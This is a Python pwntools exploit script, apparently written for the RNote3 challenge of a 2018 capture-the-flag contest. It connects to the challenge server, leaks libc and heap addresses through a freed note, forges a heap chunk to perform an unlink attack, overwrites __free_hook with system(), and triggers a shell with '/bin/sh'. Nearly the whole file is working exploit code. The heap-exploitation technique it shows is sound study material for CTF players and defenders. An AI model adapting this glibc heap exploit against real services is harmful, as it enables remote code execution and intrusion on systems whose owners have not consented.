from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "rnote3.2018.teamrois.cn"
remote_port = 7322

local_addr = "127.0.0.1"
local_port = 1807

pc = "./RNote3"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x555555554000+0x0000000000001109')
		#b *0x0804887F \n 
		#0x400b6a

def ru(a):
	return p.recvuntil(a)

def sn(a):
	p.send(a)

def rl():
	return p.recvline()

def sl(a):
	p.sendline(a)

def rv(a):
	return p.recv(a)

def raddr(a,l=None):
	if l == None:
		return u64(rv(a).ljust(8,'\x00'))
	else:
		return u64(rl().strip('\n').ljust(8,'\x00'))

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def sa(a,b):
	p.sendafter(a,b)

def sla(a,b):
	p.sendlineafter(a,b)
	
def add_note(title,size,content):
	sl('1')
	sla('title: ',title)
	sla('size: ',str(size))
	sla('content: ',content)

def show_note(title):
	sl('2')
	sla('title: ',title)


def edit_note(title,content):
	sl('3')
	sla('title: ',title)
	sla('content: ',content)

def delete_note(title):
	sl('4')
	sla('title: ',title)

def hack():
	raw_input()
	payload = 'AAAAAA'
	ru('Exit\n')
	add_note('a',0x28,payload)
	add_note('d',0x28,payload)
	add_note('b',0x88,payload)
	add_note('c',0x88,payload)
	add_note('f',0x88,payload)
	
	# step 1: leak libc
	show_note('c')
	rl()
	delete_note('ccc')
	show_note('\x00')
	ru('content: ')
	top_addr = u64(rv(6).ljust(8,'\x00'))
	lg('top_addr',top_addr)
	libc.address = top_addr - 0x58 - 0x3C4B20
	lg('libc_addr',libc.address)

	# step 2: leak heap_addr
	add_note('c',0x88,payload)
	
	show_note('a')
	rl()
	delete_note('ccc')
	add_note('e',0x88,payload)
	show_note('d')
	rl()
	delete_note('ccc')
	show_note('\x00')
	ru('content: ')
	heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
	lg('heap_addr',heap_addr)

	# step 3: unlink overwrite free_hook
	add_note('h',0x18,'AAAAA')
	show_note('e')
	rl()
	delete_note('ccc')
	delete_note('f')
	delete_note('b')
	fake_fd = heap_addr + 0xc0 - 0x18
	fake_bk = heap_addr + 0xc0 - 0x10
	payload = p64(0) + p64(0x81) + p64(fake_fd) + p64(fake_bk)
	payload = payload.ljust(0x80,'A')
	payload += p64(0x80) + p64(0x90) + p64(0) + p64(0)
	add_note('g',0x90,payload)
	add_note('i',0x70,'AAAAA')
	delete_note('c')

	show_note('\x00')
	rl()
	delete_note('ccc')

	free_hook = libc.symbols['__free_hook']
	lg('free_hook',free_hook)
	payload = p64(0x21) + p64(0x67) + p64(0x90) + p64(free_hook)
	edit_note('g',payload)
	#one_gadget = libc.address + 0xf02a4
	system_addr = libc.symbols['system']
	payload = p64(system_addr)
	edit_note('g',payload)

	add_note('aaa',0x18,'/bin/sh\0')
	delete_note('aaa')
	p.interactive()

hack()